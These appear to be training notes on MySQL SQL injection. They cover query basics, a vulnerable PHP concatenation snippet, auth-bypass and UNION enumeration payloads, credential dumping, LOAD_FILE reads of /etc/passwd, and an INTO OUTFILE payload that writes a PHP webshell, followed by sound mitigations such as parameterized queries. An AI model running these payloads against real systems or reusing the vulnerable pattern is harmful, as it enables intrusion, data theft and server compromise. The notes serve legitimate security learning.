# SQL INJECTION (MySQL)

## INTRODUCTION

SQLi = user input reaches a DB query unsanitized, letting you bend the query's logic instead of just filling in a value. Same family as command injection / XSS — input misinterpreted as code instead of data, just against SQL specifically.

To pull it off: break out of the input's expected boundary (usually a `'` or `"`), then reshape what follows into a query that still parses — either riding the original query (OR logic, comments) or bolting on an entirely new one (UNION, stacked queries).

Impact: credential/data exfil, auth bypass, unlocking admin-only features, file read/write on the host — and from file write, webshell → full server compromise. Root cause is almost always unsanitized input plus an over-privileged DB account; both get the full treatment in Mitigating SQL Injection at the end.

## INTRO TO DATABASES

DBMS = the layer that creates, hosts, and manages a database — relational, NoSQL, graph, key-value, all fall under this umbrella. Typical setup: client app → application/middleware layer → DBMS, often split across separate hosts once data volume matters.

## TYPES OF DATABASES

Relational (RDBMS) — schema-defined tables linked by keys (MySQL, MSSQL, Oracle, PostgreSQL, MariaDB). This module's scope. Non-relational (NoSQL) — no fixed schema, four common storage shapes: key-value, document-based, wide-column, graph (MongoDB's the common one). Different injection class entirely — NoSQL injection, covered elsewhere.

## INTRO TO MYSQL

```bash
mysql -u root -p                    # prompts for password — never pass it inline (-p<pass>), it lands in bash_history
mysql -u root -h <HOST> -P 3306 -p  # remote; uppercase -P for port (lowercase -p is the password flag)
```

Statements terminate with `;`. Keywords aren't case-sensitive, database/table names are — `USE users;` works, `USE USERS;` doesn't if the DB is lowercase.

```sql
CREATE DATABASE users;
SHOW DATABASES;
USE users;
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
);
SHOW TABLES;
DESCRIBE logins;
```

`AUTO_INCREMENT` self-increments the id. `NOT NULL` = required field. `UNIQUE` = no duplicates. `DEFAULT` = fallback value. `PRIMARY KEY` = the column uniquely identifying each row.

## SQL STATEMENTS

```sql
INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');   -- skip columns with defaults
INSERT INTO logins(username, password) VALUES ('john','john123!'), ('tom','tom123!');   -- multi-row

SELECT * FROM logins;
SELECT username, password FROM logins;

DROP TABLE logins;    -- permanent, zero confirmation

ALTER TABLE logins ADD newColumn INT;
ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;
ALTER TABLE logins MODIFY newerColumn DATE;
ALTER TABLE logins DROP newerColumn;

UPDATE logins SET password = 'change_password' WHERE id > 1;   -- WHERE is mandatory or every row changes
```

## QUERY RESULTS

```sql
SELECT * FROM logins ORDER BY password;              -- ascending default
SELECT * FROM logins ORDER BY password DESC;
SELECT * FROM logins ORDER BY password DESC, id ASC; -- secondary sort for ties

SELECT * FROM logins LIMIT 2;
SELECT * FROM logins LIMIT 1, 2;    -- offset (0-indexed), count — starts at row 2, returns 2 rows

SELECT * FROM logins WHERE id > 1;
SELECT * FROM logins WHERE username = 'admin';

SELECT * FROM logins WHERE username LIKE 'admin%';   -- % = zero-or-more wildcard
SELECT * FROM logins WHERE username LIKE '___';      -- _ = exactly-one wildcard, 3 = exactly 3 chars
```

Strings/dates need quotes, numbers don't.

## SQL OPERATORS

```sql
condition1 AND condition2    -- true only if both true
condition1 OR condition2     -- true if either true
NOT condition                -- flips it
```

Symbol equivalents: `&&` `||` `!`. Non-zero = true, `0` = false.

Precedence (top evaluates first):

```
/ * %
+ -
= > < <= >= != LIKE
NOT (!)
AND (&&)
OR (||)
```

Matters directly for auth-bypass payloads — `AND` binds tighter than `OR`, so in `... OR '1'='1' AND password='x'` the `AND` resolves first (false if the password's wrong), then `OR` against a true `'1'='1'` overrides it anyway.

## INTRO TO SQL INJECTIONS

Vulnerable pattern — raw input concatenated straight into a query string:

```php
$searchInput = $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
```

Normal input just fills the `LIKE` pattern. Inject a `'` and everything after becomes real SQL instead of search text:

```
1'; DROP TABLE users;
```

```sql
select * from logins where username like '%1'; DROP TABLE users;'
```

A trailing unmatched quote = syntax error unless accounted for — comments, or keeping the quote count even (next two sections). Note: stacked queries via `;` don't actually run on stock MySQL — this example's illustrative. MSSQL and PostgreSQL support them natively; MySQL needs a different route entirely.

**Types, by how output comes back:**

```
In-band     — shows directly in the response
  Union-based   extend the query, land results in a printed column
  Error-based   force a DB error that carries data in its message
Blind       — no direct output, infer bit-by-bit
  Boolean-based page behavior differs on TRUE vs FALSE
  Time-based    response delay (SLEEP()) signals TRUE
Out-of-band — exfil via a side channel (DNS etc.) when nothing else works
```

This module's focus: Union-based.

## SUBVERTING QUERY LOGIC

Discovery — throw these at any field, watch for behavior change or an error:

```
'   %27
"   %22
#   %23
;   %3B
)   %29
```

URL-encode when it's riding a GET request.

Vulnerable login:

```sql
SELECT * FROM logins WHERE username='admin' AND password='p@ssw0rd';
```

Single quote breaks it (odd quote count → syntax error) — close it with a comment, or keep the count even.

**OR-based auth bypass** — abuse `AND` > `OR` precedence: inject a condition that's always true, paired with `OR`, and the whole clause resolves true regardless of the real password.

```
admin' or '1'='1
```

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

`AND` evaluates first (false if password's wrong) but `OR` against a known-true condition overrides it anyway. Works without knowing a valid username too — same trick in the password field:

```
' or '1'='1
```

true regardless of what's in either field. Full bypass payload list: PayloadsAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings) — different payloads fit different query shapes.

## USING COMMENTS

```
-- <space>   line comment — needs the trailing space or it won't parse; URL-encoded as --+ or written -- - to make the space visible
#            line comment — in a browser URL, encode as %23 or it's treated as a page fragment and never reaches the server
```

Comment out everything after your injection instead of needing a balanced query:

```
admin'--
```

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

Password condition never evaluates — in as admin on username alone.

Parenthesis-wrapped conditions need matching closure:

```sql
SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password='<hash>';
```

`admin'--` alone breaks on the unclosed paren — close it first:

```
admin')--
```

```sql
SELECT * FROM logins WHERE (username='admin')
```

## UNION CLAUSE

`UNION` merges results from two SELECTs into one output — the core mechanic for pulling data from tables you were never meant to touch.

```sql
SELECT * FROM ports UNION SELECT * FROM ships;
```

Hard requirement: matching column count both sides, compatible-enough types per position, or MySQL throws a column-count error.

Mismatch workaround — pad with junk to match:

```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

Numbers as filler double as positional markers, so once it renders you know which junk value maps to which output column. `NULL` is the safer universal filler once past initial recon — fits every data type.

## UNION INJECTION

**Find column count** — two methods:

`ORDER BY` — climb until it errors (that column number doesn't exist → count = last one that worked):

```
' order by 1-- -
' order by 2-- -
...
' order by 5-- -   → "Unknown column '5'" → table has 4 columns
```

`UNION` — climb until it stops erroring:

```
' UNION select 1,2,3-- -      → column-count mismatch error
' UNION select 1,2,3,4-- -    → works → 4 columns
```

**Find which columns print** — not every selected column reaches the page. Swap a number for `@@version` in each position, see which one renders real output instead of staying blank or showing the raw junk value — that position is your usable injection point going forward.

```
cn' UNION select 1,@@version,3,4-- -
```

## DATABASE ENUMERATION

**Fingerprint the DBMS first** — different DBMS, different dialect:

```
SELECT @@version    full output available   → version string, confirms MySQL/MariaDB
SELECT POW(1,1)     numeric-only output     → returns 1, errors on other DBMS
SELECT SLEEP(5)     blind/no output         → 5s delay confirms MySQL specifically
```

**INFORMATION_SCHEMA** — metadata DB, holds every DB/table/column name on the server. Cross-DB reference needs the dot operator: `<db>.<table>`.

```sql
-- list every DB (skip mysql, information_schema, performance_schema, sometimes sys — always present, never the target)
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

-- current DB the app's actually running against
cn' UNION select 1,database(),2,3-- -

-- tables inside a specific DB
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='<DB>'-- -

-- columns inside a specific table
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<TABLE>'-- -

-- dump the data — dot operator for cross-DB reference
cn' UNION select 1, username, password, 4 from <DB>.<TABLE>-- -
```

## READING FILES

Needs the `FILE` privilege specifically — DBA doesn't automatically include it, check directly.

```sql
cn' UNION SELECT 1, user(), 3, 4-- -                                              -- current DB user
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user='root'-- -        -- Y = superuser
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -   -- full privilege list, look for FILE
```

With `FILE` confirmed:

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

Read also needs the OS user running MySQL to have OS-level read rights on that specific file — DB privilege alone isn't sufficient. Source disclosure works the same way — read the vulnerable page's own file, `CTRL+U` to view raw if the browser tries to render it as HTML instead of dumping text:

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

## WRITING FILES

Three requirements, all mandatory: `FILE` privilege, `secure_file_priv` not locked down, OS-level write access to the target directory.

`secure_file_priv` meaning: empty = read/write anywhere, a set path = restricted to that directory only (MySQL defaults to `/var/lib/mysql-files`), `NULL` = disabled entirely (some hardened configs). MariaDB defaults to empty.

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name='secure_file_priv'-- -
```

Write:

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

`FROM_BASE64('<DATA>')` for long or binary content that a plain string literal can't carry cleanly.

Need the webroot to write anywhere useful — `LOAD_FILE` the server config to confirm it (`/etc/apache2/apache2.conf`, `/etc/nginx/nginx.conf`, `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config` for IIS), fuzz common webroot paths if config's unreadable, or read server error messages for path hints as a last resort.

Webshell:

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

```
http://<TARGET_IP>:<PORT>/shell.php?0=id
```

`""` instead of numbers as filler on write payloads — numbers land in the output file as literal junk characters wrapped around your actual content, `""` keeps it clean.

## MITIGATING SQL INJECTION

**Input sanitization** — escape special characters before they reach the query:

```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
```

PostgreSQL equivalent: `pg_escape_string()`.

**Input validation** — restrict to the expected format, reject anything else:

```php
$pattern = "/^[A-Za-z\s]+$/";
if(!preg_match($pattern, $code)) { die("Invalid input!"); }
```

**Least privilege** — the account the app authenticates as should never be root/admin-equivalent:

```sql
CREATE USER 'reader'@'localhost';
GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY '<PASSWORD>';
```

Confirmed in practice — that user queries its one allowed table fine, gets denied on everything else, including other tables in its own database.

**WAF** — catches common injection markers even when app logic itself is flawed (`INFORMATION_SCHEMA` is a classic auto-blocked string). ModSecurity (open-source), Cloudflare (managed), etc.

**Parameterized queries** — the actual fix, not a patch on string concatenation. Placeholders get bound and escaped by the driver itself instead of being spliced into the query:

```php
$query = "SELECT * FROM logins WHERE username=? AND password=?";
$stmt = mysqli_prepare($conn, $query);
mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
mysqli_stmt_execute($stmt);
```

Same concept holds across every language/driver with prepared-statement support — this one's PHP/mysqli, but it ports directly.